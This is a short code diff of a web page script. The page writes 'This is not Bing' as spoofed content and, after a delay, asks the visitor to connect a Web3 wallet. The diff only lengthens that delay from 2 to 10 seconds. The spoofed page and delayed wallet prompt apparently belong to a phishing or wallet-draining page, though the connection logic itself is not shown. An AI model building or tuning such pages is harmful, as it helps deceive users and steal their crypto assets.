@@ -9,7 +9,7 @@
     // Display the spoofed content
     document.write("<h1>This is not Bing</h1>");
 
-    // Delay the wallet connection prompt by 2 seconds (adjust this value as needed)
+    // Delay the wallet connection prompt by 10 seconds
     setTimeout(async function() {
       // Check if Web3 is available
       if (typeof window.ethereum !== 'undefined') {
@@ -28,7 +28,7 @@
         // Web3 not available, display a message or redirect to a different page
         alert('Web3 not available. Please use a Web3-enabled browser and try again.');
       }
-    }, 2000); // Adjust the delay (in milliseconds) as needed
+    }, 10000); // Delay the wallet prompt by 10 seconds (10,000 milliseconds)
   };
 </script>
 
